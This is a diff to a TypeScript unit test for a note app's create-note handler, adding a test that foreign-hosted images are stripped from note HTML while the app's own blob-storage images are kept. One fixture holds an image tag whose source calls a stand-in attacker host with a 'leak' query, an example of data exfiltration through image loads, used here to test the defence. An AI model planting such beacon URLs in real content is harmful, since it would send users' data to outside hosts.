@@ -23,6 +23,36 @@ function decodeYjsBuffer(buf: Buffer) {
   return node.toJSON();
 }
 
+const FOREIGN_FIGURE =
+  '<figure data-image=""><img src="https://attacker.example/leak?d=secret" alt=""><figcaption></figcaption></figure>';
+const BLOB_FIGURE =
+  '<figure data-image=""><img src="https://knowtis.public.blob.vercel-storage.com/notes/n1/a.webp" alt="a"><figcaption></figcaption></figure>';
+
+const CREATED_NOTE: NoteEntity = {
+  id: 'note-created',
+  title: 'T',
+  content: '',
+  ownerId: 'user-1',
+  generalAccess: 'restricted',
+  generalAccessPermission: 'viewer',
+  shareToken: null,
+  editorsCanShare: false,
+  bucket: null,
+  supertag: null,
+  supertagFields: null,
+  yjsState: null,
+  createdAt: new Date(),
+  updatedAt: new Date(),
+};
+
+function renderedState(state: Buffer): string {
+  const doc = new Y.Doc();
+  Y.applyUpdate(doc, new Uint8Array(state));
+  const html = htmlToYjsModule.yDocToHtml(doc);
+  doc.destroy();
+  return html;
+}
+
 describe('CreateNoteHandler', () => {
   let handler: CreateNoteHandler;
   let mockRepository: NoteWriteRepository;
@@ -83,7 +113,7 @@ describe('CreateNoteHandler', () => {
     expect(mockRepository.createWithYjsState).toHaveBeenCalledWith(
       {
         title: input.title,
-        content: input.content,
+        content: '<p>Valid content</p>',
         ownerId: expect.objectContaining({ value: input.ownerId }),
       },
       expect.any(Buffer)
@@ -145,6 +175,23 @@ describe('CreateNoteHandler', () => {
     const decoded = decodeYjsBuffer(bufferArg as Buffer);
     // Input was '<p>hi</p>' → round-trip should contain 'hi' text
     expect(JSON.stringify(decoded)).toContain('hi');
+  });
+
+  it('stores the content its CRDT state renders, so a foreign image is in neither', async () => {
+    vi.spyOn(mockRepository, 'createWithYjsState').mockResolvedValue(
+      ok(CREATED_NOTE)
+    );
+
+    await handler.execute({
+      title: 'T',
+      content: `<p>Kept</p>${FOREIGN_FIGURE}${BLOB_FIGURE}`,
+      ownerId: 'user-1',
+    });
+
+    const [dataArg, bufferArg] = vi.mocked(mockRepository.createWithYjsState)
+      .mock.calls[0];
+    expect(dataArg.content).toBe(`<p>Kept</p>${BLOB_FIGURE}`);
+    expect(renderedState(bufferArg)).toBe(dataArg.content);
   });
 
   it('should return INVALID_CONTENT and not insert when htmlToYjsState throws', async () => {
